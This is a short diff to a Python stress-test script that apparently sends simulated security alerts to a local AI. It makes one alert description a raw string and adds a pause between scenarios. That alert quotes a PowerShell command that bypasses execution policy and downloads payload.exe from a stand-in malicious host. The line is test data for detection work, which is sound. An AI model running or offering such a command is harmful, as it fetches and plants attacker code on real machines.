@@ -90,7 +90,7 @@ scenarios = [
         "payload": {
             "alert": {
                 "id": 1005,
-                "description": "Suspicious PowerShell Execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Temp\update.exe",
+                "description": r"Suspicious PowerShell Execution: powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Temp\update.exe",
                 "level": 12,
                 "src_ip": "192.168.1.77",
                 "timestamp": "2026-07-22T13:20:00Z"
@@ -216,6 +216,9 @@ for scenario in scenarios:
         err = str(e)
         print(f"ERROR ({elapsed}s): {err}")
         results.append({"scenario": scenario["name"], "result": None, "elapsed": elapsed, "error": err})
+    
+    print("⏳ Giving the local AI 3 seconds to cool down...")
+    time.sleep(3)
 
 print("\n" + "=" * 60)
 print("  STRESS TEST SUMMARY")
